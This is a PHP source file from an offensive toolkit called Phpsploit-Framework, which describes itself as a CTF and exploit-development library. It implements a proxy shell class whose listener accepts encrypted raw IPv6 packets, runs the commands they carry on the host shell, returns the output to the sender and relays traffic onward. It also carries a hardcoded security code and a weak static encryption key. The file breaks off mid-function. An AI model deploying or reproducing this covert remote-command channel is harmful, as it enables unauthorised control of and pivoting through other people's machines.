<?php
/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:34
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_ProxyShell extends Class_Root implements Interface_Operate
{
    const SECURITY_CODE                       = "_huc0day_dsafj22892l3832shhj3_";
    const SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID = 64;

    public static function init_session_ipv6_address_info ( $src_ipv6_address = "" , $proxy_ipv6_address = "" , $dst_ipv6_address = "" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! isset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] ) ) || ( ! is_string ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] ) ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] = "";
        }
        if ( ( ! isset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] ) ) || ( ! is_string ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] ) ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] = "";
        }
        if ( ( ! isset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] ) ) || ( ! is_string ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] ) ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] = "";
        }
        if ( ! empty( $src_ipv6_address ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] = $src_ipv6_address;
        }
        if ( ! empty( $proxy_ipv6_address ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] = $proxy_ipv6_address;
        }
        if ( ! empty( $dst_ipv6_address ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] = $dst_ipv6_address;
        }
    }

    public static function get_session_id ( $ipv6 )
    {
        return self::get_local_src_to_dst_session_id ( $ipv6 );
    }

    public static function create_session_id ( $src_ipv6 , $dst_ipv6 )
    {
        return self::create_authentication_code ( $src_ipv6 , $dst_ipv6 );
    }

    public static function get_authentication_code ( $src_ipv6 , $dst_ipv6 )
    {
        return self::init_authentication_code ( $src_ipv6 , $dst_ipv6 );
    }

    public static function create_authentication_code ( $src_ipv6 , $dst_ipv6 )
    {
        $_shmid_key = self::get_source_shmid_key ( $src_ipv6 );
        $_shmid     = Class_Base_Memory::open_share_memory ( $_shmid_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( empty( $_shmid ) ) {
            $_shmid = Class_Base_Memory::create_share_memory ( $_shmid_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID );
            if ( empty( $_shmid ) ) {
                throw new \Exception( "share memory create is error ( src_ipv6 [ " . $src_ipv6 . " ] , dst_ipv6 [ " . $dst_ipv6 . " ] ) , share memory key ( " . $_shmid_key . " ) , share memory mode ( " . Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE . " ) , share memory size ( " . self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID . " ) , share memory flag ( " . Class_Base_Memory::FLAGS_SHARE_MEMORY_CREATE . " ) " , 0 );
            }
        }
        $_authentication_code = self::create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 );
        $_write_length        = Class_Base_Memory::write_share_memory ( $_shmid , $_authentication_code , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_write_length ) ) {
            throw new \Exception( "share memory write is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) , data ( " . print_r ( $_authentication_code , true ) . " ) " );
        }
        return $_authentication_code;
    }

    public static function init_authentication_code ( $src_ipv6 , $dst_ipv6 )
    {
        $_shmid_key = self::get_source_shmid_key ( $src_ipv6 );
        $_shmid     = self::get_shmid ( $_shmid_key );
        if ( empty( $_shmid ) ) {
            throw new \Exception( "share memory create is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) " );
        }
        $_authentication_code = Class_Base_Memory::read_share_memory ( $_shmid , 0 , 32 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_authentication_code ) ) {
            $_authentication_code = self::create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 );
            $_write_length        = Class_Base_Memory::write_share_memory ( $_shmid , $_authentication_code , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( empty( $_write_length ) ) {
                throw new \Exception( "share memory write is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) , data ( " . print_r ( $_authentication_code , true ) . " ) " );
            }
            return $_authentication_code;
        }
        $_authentication_code = Class_Base_Format::data_to_string ( $_authentication_code );
        if ( empty( $_authentication_code ) ) {
            $_authentication_code = self::create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 );;
            $_write_length = Class_Base_Memory::write_share_memory ( $_shmid , $_authentication_code , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( empty( $_write_length ) ) {
                throw new \Exception( "share memory write is error , key ( " . print_r ( $_shmid_key , true ) . " ) , src ipv6 ( " . print_r ( $src_ipv6 , true ) . " ) , data ( " . print_r ( $_authentication_code , true ) . " ) " );
            }
            return $_authentication_code;
        }
        return $_authentication_code;
    }

    public static function clear_authentication_code ( $src_ipv6 )
    {
        $_shmid_key = self::get_source_shmid_key ( $src_ipv6 );
        self::clear_shmid ( $_shmid_key );
    }

    public static function send ( $src_ipv6 , $dst_ipv6 , $proxy_ipv6 , $command , $encode_key , $encode_iv_base64 , $debug = 0 )
    {
        $_local_ipv6 = Class_Base_RawSocket::get_local_ipv6_address ();
        if ( empty( $_local_ipv6 ) ) {
            throw new \Exception( "Local global IPV6 address acquisition failed ! " );
        }
        if ( ( empty( $src_ipv6 ) ) || ( ! is_string ( $src_ipv6 ) ) || ( ! Class_Base_Format::is_ipv6_address ( $src_ipv6 ) ) ) {
            $src_ipv6 = $_local_ipv6;
        }
        if ( ( empty( $proxy_ipv6 ) ) || ( ! is_string ( $proxy_ipv6 ) ) || ( ! Class_Base_Format::is_ipv6_address ( $proxy_ipv6 ) ) ) {
            $proxy_ipv6 = $_local_ipv6;
        }
        if ( ( empty( $dst_ipv6 ) ) || ( ! is_string ( $dst_ipv6 ) ) || ( ! Class_Base_Format::is_ipv6_address ( $dst_ipv6 ) ) ) {
            $dst_ipv6 = $_local_ipv6;
        }
        if ( empty( $command ) || ( ! is_string ( $command ) ) || ( strlen ( $command ) <= 0 ) ) {
            $command = "exit";
        }
        $_src_to_dst_session_id = self::create_session_id ( $src_ipv6 , $dst_ipv6 );
        $_dst_to_src_session_id = self::create_session_id ( $dst_ipv6 , $src_ipv6 );
        $_data                  = ( $_src_to_dst_session_id . " " . $command );
        $_data                  = Class_Base_Security::phpsploit_encode ( $_data , $encode_key , base64_decode ( $encode_iv_base64 ) );
        $_send_package          = Class_Base_RawSocket::create_ipv6_data_package ( $src_ipv6 , $dst_ipv6 , $_data );
        $_packet_size_sent      = Class_Base_RawSocket::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $proxy_ipv6 );
        return array ( "src_ipv6" => $src_ipv6 , "dst_ipv6" => $dst_ipv6 , "proxy_ipv6" => $proxy_ipv6 , "package_size" => strlen ( $_send_package ) , "src_to_dst_session_id" => $_src_to_dst_session_id , "dst_to_src_session_id" => $_dst_to_src_session_id , "command" => $command , "send_time" => time () , "packet_size_sent" => $_packet_size_sent , "encode_iv" => $encode_key , "encode_iv_base64" => $encode_iv_base64 , "encode_data" => $_data );
    }

    public static function receive ( $encode_key , $encode_iv_base64 , $local_ipv6 = null , $result_show_id = "result_show_id" , $debug = 0 )
    {
        try {
            if ( ( ! empty( $local_ipv6 ) ) && ( is_string ( $local_ipv6 ) ) && ( Class_Base_Format::is_ipv6_address ( $local_ipv6 ) ) ) {
                $_local_ipv6 = $local_ipv6;
            } else {
                $_local_ipv6 = Class_Base_RawSocket::get_local_ipv6_address ();
            }
            Class_Base_RawSocket::get_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            Class_Base_RawSocket::select_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , 6 );
            while ( true ) {
                Class_Base_RawSocket::check_browser_service_stop ();
                $_receive_package = Class_Base_RawSocket::receive_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_data , $_local_ipv6 , Class_Base_RawSocket::SIZE_RECEIVE_BYTE_MAX );
                $_src_ipv6        = $_receive_package[ "head_source_address" ];
                $_dst_ipv6        = $_receive_package[ "head_destination_address" ];
                $_encode_data     = $_receive_package[ "data" ];
                $_data            = @Class_Base_Security::phpsploit_decode ( $_encode_data , $encode_key , base64_decode ( $encode_iv_base64 ) );
                if ( ! is_string ( $_data ) ) {
                    $_data = "";
                }
                if ( ! empty( $debug ) ) {
                    Class_Base_Response::outputln ( array ( "src_ipv6" => $_src_ipv6 , "dst_ipv6" => $_dst_ipv6 , "encode_key" => $encode_key , "encode_iv_base64" => $encode_iv_base64 , "encode_data" => $_encode_data , "encode_data_size" => strlen ( $_encode_data ) , "data" => $_data , "data_size" => strlen ( $_data ) ) );
                }
                if ( $_dst_ipv6 == $_local_ipv6 ) {
                    $_data_length = strlen ( $_data );
                    if ( $_data_length < 32 ) {
                        if ( ! is_cli () ) {
                            Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response::outputln ( "\n" . ( $_src_ipv6 . " is authentication failed in data length ( " . $_data_length . " )  , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                        }
                    } else {
                        $_src_to_dst_session_id = Class_Base_Format::data_to_string ( substr ( $_data , 0 , 32 ) );
                        if ( empty( $_src_to_dst_session_id ) ) {
                            if ( ! is_cli () ) {
                                Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                Class_Base_Response::outputln ( "\n" . ( $_src_ipv6 . " is authentication failed in src_to_dst_session_id ( " . print_r ( $_src_to_dst_session_id , true ) . " ) , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                            }
                        } else {
                            $_local_src_to_dst_session_id = self::create_session_id ( $_src_ipv6 , $_dst_ipv6 );
                            if ( $_local_src_to_dst_session_id == $_src_to_dst_session_id ) {
                                $_chr32_position = strpos ( $_data , chr ( 32 ) );
                                if ( ( $_chr32_position == 32 ) && ( $_data_length > 33 ) ) {
                                    $_content = Class_Base_Format::data_to_string ( substr ( $_data , 33 , ( $_data_length - 33 ) ) );
                                    if ( ! is_cli () ) {
                                        Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( "receive form " . $_src_ipv6 . " to " . $_dst_ipv6 . " , src_to_dst_session_id ( " . $_src_to_dst_session_id . " ) , content ( " . $_content . " ) " ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response::outputln ( "\n" . ( "receive form " . $_src_ipv6 . " to " . $_dst_ipv6 . " , src_to_dst_session_id ( " . $_src_to_dst_session_id . " ) , package size : " . $_receive_package[ "package_size" ] . " , content ( " . $_content . " ) " ) . "\n" );
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch ( \Exception $e ) {
            Class_Base_RawSocket::clear_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( print_r ( $e , true ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "\n" . ( print_r ( $e , true ) ) . "\n" );
            }
        }
    }

    public static function listen ( $local_ipv6 = null , $result_show_id = "result_show_id" , $debug = 0 )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_encode_key       = ( empty( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) ? ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] = "1234567890123456890123456789012" ) : ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) );
        $_encode_iv_base64 = ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ? ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] = base64_encode ( openssl_random_pseudo_bytes ( openssl_cipher_iv_length ( "AES-256-CBC" ) ) ) ) : ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) );
        //$_encode_key       = ( empty( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) ? ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] = md5 ( time () . rand ( 10000000 , 99999999 ) ) ) : ( $_SESSION[ "SOCKET_PROXY_SHELL_ENCODE_KEY" ] ) );
        //$_encode_iv_base64 = ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ? ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] = base64_encode ( "1234567890123456890123456789012" ) ) : ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) );

        Class_Base_Response::outputln ( "" );
        Class_Base_Response::outputln ( "encode_key : " . $_encode_key );
        Class_Base_Response::outputln ( "encode_iv_base64 : " . $_encode_iv_base64 );
        Class_Base_Response::outputln ( "" );

        try {
            if ( ( ! empty( $local_ipv6 ) ) && ( is_string ( $local_ipv6 ) ) && ( Class_Base_Format::is_ipv6_address ( $local_ipv6 ) ) ) {
                $_local_ipv6 = $local_ipv6;
            } else {
                $_local_ipv6 = Class_Base_RawSocket::get_local_ipv6_address ();
            }
            Class_Base_RawSocket::get_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            Class_Base_RawSocket::select_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , 6 );
            while ( true ) {
                Class_Base_RawSocket::check_browser_service_stop ();
                $_receive_package       = Class_Base_RawSocket::receive_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_data , $_local_ipv6 , Class_Base_RawSocket::SIZE_RECEIVE_BYTE_MAX );
                $_src_ipv6              = $_receive_package[ "head_source_address" ];
                $_dst_ipv6              = $_receive_package[ "head_destination_address" ];
                $_data                  = $_receive_package[ "data" ];
                $_data                  = Class_Base_Security::phpsploit_decode ( $_data , $_encode_key , base64_decode ( $_encode_iv_base64 ) );
                $_src_to_dst_session_id = self::get_local_src_to_dst_session_id ( $_src_ipv6 );
                if ( empty( $_src_to_dst_session_id ) ) {
                    Class_Base_Response::outputln ( "The session authorization ID issued by the packet receiver ( " . $_dst_ipv6 . " ) to the packet sender ( " . $_src_ipv6 . " ) was not detected in the local environment ( " . $_local_ipv6 . " ) . This packet has been filtered and ignored!" );
                    continue;
                }
                if ( $_dst_ipv6 != $_local_ipv6 ) {
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( "receive from " . $_src_ipv6 . " to " . $_dst_ipv6 . " , package size ( " . $_receive_package[ "package_length" ] . " ) , data size ( " . $_receive_package[ "data_length" ] . " ) , data : " . $_receive_package[ "data" ] ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "\n" . ( "receive from " . $_src_ipv6 . " to " . $_dst_ipv6 . " , package size ( " . $_receive_package[ "package_length" ] . " ) , data size ( " . $_receive_package[ "data_length" ] . " ) , data : " . $_receive_package[ "data" ] ) . "\n" );
                    }
                    $_send_package = Class_Base_RawSocket::create_ipv6_data_package ( $_src_ipv6 , $_dst_ipv6 , $_receive_package[ "data" ] );
                    Class_Base_RawSocket::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_dst_ipv6 );
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( "send from " . $_local_ipv6 . " to " . $_dst_ipv6 . " , src_ipv6 (" . $_src_ipv6 . ") , package size : " . strlen ( $_send_package ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "\n" . ( "send from " . $_local_ipv6 . " to " . $_dst_ipv6 . " , src_ipv6 (" . $_src_ipv6 . ") , package size : " . strlen ( $_send_package ) ) . "\n" );
                    }
                    $_send_package    = null;
                    $_receive_package = null;
                } else {
                    $_data_length = strlen ( $_data );
                    if ( $_data_length < 32 ) {
                        $_send_package = Class_Base_RawSocket::create_ipv6_data_package ( $_receive_package[ "head_source_address" ] , $_src_ipv6 , "authentication failed" );
                        Class_Base_RawSocket::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_src_ipv6 );
                        if ( ! is_cli () ) {
                            Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response::outputln ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                        }
                    }
                    $_src_to_dst_session_id     = substr ( $_data , 0 , 32 );
                    $_local_authentication_code = self::get_local_src_to_dst_session_id ( $_src_ipv6 );
                    if ( ! empty( $_local_authentication_code ) ) {
                        if ( $_src_to_dst_session_id == $_local_authentication_code ) {
                            if ( ( $_data_length >= ( 33 + 4 ) ) && ( substr ( $_data , 33 , 4 ) == "exit" ) ) {
                                throw new \Exception( "exit" , 0 );
                            }
                            if ( ( $_data_length > 33 ) ) {
                                $_command = substr ( $_data , 33 );
                                if ( self::equals_command ( $_src_ipv6 , $_command ) ) {
                                    $_send_authentication_code = self::get_authentication_code ( $_local_ipv6 , $_src_ipv6 );
                                    $_command_execute_result   = self::read_source_ipv6_command_content ( $_src_ipv6 );
                                    $_send_data_filter_length  = strlen ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) );
                                    $_send_data                = ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) . $_command_execute_result );
                                    $_send_data_length         = strlen ( $_send_data );
                                    if ( $_send_data_length > ( $_send_data_filter_length + 400 ) ) {
                                        $_send_data = $_show_send_data = ( substr ( $_send_data , 0 , ( $_send_data_filter_length + 400 ) ) . ( chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) );
                                    } else {
                                        $_show_send_data = $_send_data;
                                    }
                                    $_send_data    = Class_Base_Security::phpsploit_encode ( $_send_data , $_encode_key , base64_decode ( $_encode_iv_base64 ) );
                                    $_send_package = Class_Base_RawSocket::create_ipv6_data_package ( $_local_ipv6 , $_src_ipv6 , $_send_data );
                                    if ( $_src_ipv6 != $_local_ipv6 ) {
                                        Class_Base_RawSocket::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_src_ipv6 );
                                    }
                                    if ( ! is_cli () ) {
                                        Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response::outputln ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) . ( empty( $debug ) ? ( "" ) : ( " , encode_data : " . ( $_send_data ) . " , encode_data_size : " . strlen ( $_send_data ) ) ) . "\n" );
                                    }
                                } else {
                                    $_command_execute_result        = Class_Base_Shell::command ( $_command );
                                    $_command_execute_result        = Class_Base_Format::array_to_string ( $_command_execute_result );
                                    $_command_execute_result_length = strlen ( $_command_execute_result );
                                    $_write_length                  = self::write_source_ipv6_command_content ( $_src_ipv6 , $_command , $_command_execute_result );
                                    if ( $_write_length === false ) {
                                        throw new \Exception( "Failed to write the command execution result to Shared memory!" , 0 );
                                    }
                                    $_send_authentication_code           = self::get_authentication_code ( $_local_ipv6 , $_src_ipv6 );
                                    $_send_data_filter_length            = strlen ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) );
                                    $_command_execute_result_show_length = ( 984 - $_send_data_filter_length );
                                    if ( $_command_execute_result_length > $_command_execute_result_show_length ) {
                                        $_command_execute_result = ( substr ( $_command_execute_result , 0 , ( $_command_execute_result_show_length - 6 ) ) . ( chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) );
                                    }
                                    $_send_data        = ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) . $_command_execute_result );
                                    $_send_data_length = strlen ( $_send_data );
                                    if ( $_send_data_length > ( $_send_data_filter_length + 400 ) ) {
                                        $_send_data = $_show_send_data = ( substr ( $_send_data , 0 , ( $_send_data_filter_length + 400 ) ) . ( chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) );
                                    } else {
                                        $_show_send_data = $_send_data;
                                    }
                                    $_send_data    = Class_Base_Security::phpsploit_encode ( $_send_data , $_encode_key , base64_decode ( $_encode_iv_base64 ) );
                                    $_send_package = Class_Base_RawSocket::create_ipv6_data_package ( $_local_ipv6 , $_src_ipv6 , $_send_data );
                                    if ( $_src_ipv6 != $_local_ipv6 ) {
                                        Class_Base_RawSocket::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_src_ipv6 );
                                    }
                                    if ( ! is_cli () ) {
                                        Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response::outputln ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) . ( empty( $debug ) ? ( "" ) : ( " , encode_data : " . ( $_send_data ) . " , encode_data_size : " . strlen ( $_send_data ) ) ) . "\n" );
                                    }
                                }
                                $_command                            = null;
                                $_command_execute_result             = null;
                                $_command_execute_result_length      = null;
                                $_send_authentication_code           = null;
                                $_send_data_filter_length            = null;
                                $_command_execute_result_show_length = null;
                                $_send_data                          = null;
                                $_send_package                       = null;
                            }
                        }
                    }
                    $_data_length               = null;
                    $_src_to_dst_session_id     = null;
                    $_local_authentication_code = null;
                }
                $_receive_package       = null;
                $_src_ipv6              = null;
                $_dst_ipv6              = null;
                $_data                  = null;
                $_src_to_dst_session_id = null;
            }
            $_local_ipv6 = null;

        } catch ( \Exception $e ) {
            Class_Base_RawSocket::clear_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $result_show_id , ( "\n" . ( print_r ( $e , true ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "\n" . ( print_r ( $e , true ) ) . "\n" );
            }
        }
    }

    public static function get_source_shmid_key ( $src_ipv6 )
    {
        $_long6           = Class_Base_RawSocket::ipv6_to_long6 ( $src_ipv6 );
        $_shmid_key_right = substr ( $_long6 , - 18 , 18 );
        $_shmid_key       = intval ( $_shmid_key_right );
        return $_shmid_key;
    }

    public static function get_shmid ( $shmid_key )
    {
        $_shmid = Class_Base_Memory::open_share_memory ( $shmid_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        return $_shmid;
    }

    public static function clear_shmid ( $shmid_key )
    {
        $_shmid = self::get_shmid ( $shmid_key );
        if ( ! empty( $_shmid ) ) {
            return Class_Base_Memory::clear_share_memory ( $_shmid );
        }
        return false;
    }

    public static function get_local_src_to_dst_session_id ( $src_ipv6 )
    {
        $_shmid_key = self::get_source_shmid_key ( $src_ipv6 );
        $_shmid     = self::get_shmid ( $_shmid_key );
        if ( empty( $_shmid ) ) {
            return null;
        }
        $_src_to_dst_session_id = Class_Base_Memory::read_share_memory ( $_shmid , 0 , 32 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_src_to_dst_session_id ) ) {
            return null;
        }
        $_src_to_dst_session_id = Class_Base_Format::data_to_string ( $_src_to_dst_session_id );
        if ( empty( $_src_to_dst_session_id ) ) {
            return null;
        }
        return $_src_to_dst_session_id;
    }

    public static function create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 )
    {
        if ( ( ! is_string ( $src_ipv6 ) ) || ( strlen ( $src_ipv6 ) <= 0 ) ) {
            throw new \Exception( "src_ipv6 is input error , src_ipv6 : " . print_r ( $src_ipv6 , true ) );
        }
        if ( ( ! is_string ( $dst_ipv6 ) ) || ( strlen ( $dst_ipv6 ) <= 0 ) ) {
            throw new \Exception( "dst_ipv6 is input error , dst_ipv6 : " . print_r ( $dst_ipv6 , true ) );
        }
        $_send_authentication_code = md5 ( ( Class_Base_RawSocket::ipv6_to_long6 ( $src_ipv6 ) . ( self::SECURITY_CODE ) . Class_Base_RawSocket::ipv6_to_long6 ( $dst_ipv6 ) ) );
        return $_send_authentication_code;
    }

    public static function get_command_share_memory_key ( $command )
    {
        $_command_share_memory_key             = md5 ( $command );
        $_command_share_memory_key_header      = substr ( $_command_share_memory_key , 0 , 5 );
        $_command_share_memory_key_footer      = substr ( $_command_share_memory_key , 28 , 4 );
        $_command_share_memory_key_string      = ( $_command_share_memory_key_header . $_command_share_memory_key_footer );
        $_command_share_memory_key_items       = str_split ( $_command_share_memory_key_string );
        $_command_share_memory_key_ascii_items = array ();
        foreach ( $_command_share_memory_key_items as $index => $command_share_memory_key_item ) {
            $_ascii_code_string        = strval ( ord ( $command_share_memory_key_item ) );
            $_ascii_code_string_length = strlen ( $_ascii_code_string );
            if ( $_ascii_code_string_length < 2 ) {
                $_ascii_code_string = ( '0' . $_ascii_code_string );
            } else if ( $_ascii_code_string_length > 2 ) {
                $_ascii_code_string = substr ( $_ascii_code_string , 1 , 2 );
            }
            $_command_share_memory_key_ascii_items[] = $_ascii_code_string;
        }
        $_command_share_memory_key_string  = implode ( "" , $_command_share_memory_key_ascii_items );
        $_command_share_memory_key_integer = intval ( $_command_share_memory_key_string );
        return $_command_share_memory_key_integer;
    }

    public static function equals_command ( $src_ipv6 , $command )
    {
        if ( ( is_string ( $command ) ) && ( strlen ( $command ) > 0 ) ) {
            $_src_ipv6_key = self::get_source_ipv6_command_key ( $src_ipv6 );
            $_command_key  = self::get_command_share_memory_key ( $command );
